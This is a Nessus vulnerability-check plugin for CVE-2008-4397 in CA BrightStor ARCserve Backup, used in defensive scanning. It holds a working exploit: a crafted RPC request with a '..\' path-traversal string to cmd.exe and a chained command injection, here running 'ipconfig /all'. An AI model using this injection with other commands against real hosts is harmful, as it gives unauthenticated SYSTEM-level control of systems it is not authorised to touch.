#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(34393);
 script_version("$Revision: 1.20 $");
 script_cvs_date("$Date: 2016/11/11 19:58:29 $");

 script_cve_id("CVE-2008-4397");
 script_bugtraq_id(31684);
 script_osvdb_id(49468);

 script_name(english:"CA BrightStor ARCserve Backup RPC Interface (asdbapi.dll) Traversal Arbitrary Command Execution");
 script_summary(english:"Check command execution in BrightStor ARCServe for Windows");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code can be executed on the remote host.");
 script_set_attribute(attribute:"description", value:
"This host is running BrightStor ARCServe for Windows. 

The remote version of this software is affected by an arbitrary
command execution vulnerability. 

By sending a specially crafted packet to the RPC server on TCP port
6504, an unauthenticated, remote attacker may be able to execute code
on the remote host with SYSTEM privileges.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Oct/88");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?934ec85b");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Oct/79");
 script_set_attribute(attribute:"solution", value:
"Apply the relevant update referenced in the CA security notice.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Computer Associates ARCserve REPORTREMOTEEXECUTECML Buffer Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');
 script_cwe_id(20, 22);

 script_set_attribute(attribute:"plugin_publication_date", value:"2008/10/14");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:ca:arcserve_backup");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"Windows");
 script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

 script_dependencies("smb_nativelanman.nasl");
 script_require_keys("Host/OS/smb");
 script_require_ports(6504);
 
 exit(0);
}


include ('smb_func.inc');

function RPC_Bind ()
{
 local_var ret, resp, soc;

 soc = session_get_socket ();

 ret = dce_rpc_bind(cid:session_get_cid(), uuid:"506b1890-14c8-11d1-bbc3-00805fa6962e ", vers:1);
 send (socket:soc, data:ret);
 resp = recv (socket:soc, length:4096);

 if (!resp)
   return -1;

 ret = dce_rpc_parse_bind_ack (data:resp);
 if (isnull (ret) || (ret != 0))
   return -1;

 return 0;
}


function RPC_ReportRemoteExecuteCML (host, windir, cmd)
{
 local_var data, ret, resp, soc, tfile, len, code;

 soc = session_get_socket ();
 tfile = string ("nessus_", rand() & 0xFF, ".tmp");

 session_set_unicode (unicode:0);

 data = 
	class_name (name:host) +
	class_name (name:"..\..\..\..\..\..\..\..\..\"+windir+"\system32\cmd /C echo " + '"') + 
        class_name (name:'" > %tmp%\\' + tfile + ' && for /f "tokens=6" %f in (%tmp%\\' + tfile + ') do ( ' + cmd + ' > %f ) && del %tmp%\\' + tfile ) +
        class_name (name:"test2") +
        raw_dword (d:0x20) +
        raw_dword (d:0x20) +
        crap(data:"A", length:0x20) +
        raw_dword (d:0) +
        raw_dword (d:0x400);

 session_set_unicode (unicode:1);

 ret = dce_rpc_request (code:0x156, data:data);
 send (socket:soc, data:ret);
 resp = recv (socket:soc, length:4096, timeout:20);

 resp = dce_rpc_parse_response (data:resp);
 len = strlen(resp);

 code = get_dword (blob:resp, pos:len-4);
 if (code != 0)
   return NULL;

 data = substr(resp, 12, len-8);

 return data;
}



port = 6504;
if ( ! get_port_state(port) ) exit(0);
soc = open_sock_tcp (port);
if (!soc) exit (0);

session_init (socket:soc);

ret = RPC_Bind ();
if (ret != 0)
  exit (0);


os = get_kb_item("Host/OS/smb");
if ("5.0" >< os)
  windir = "winnt";
else
  windir = "windows";

# Requires the real host name (not the ip address)
host = kb_smb_name();
cmd = "ipconfig /all";

ret = RPC_ReportRemoteExecuteCML (host:host, windir:windir, cmd:cmd);
if (!isnull(ret))
{
 report = string (
         "\nThe output of the command '", cmd, "' is:\n\n",
         ret );
 security_hole(port:port, extra:report);
}

close (soc);
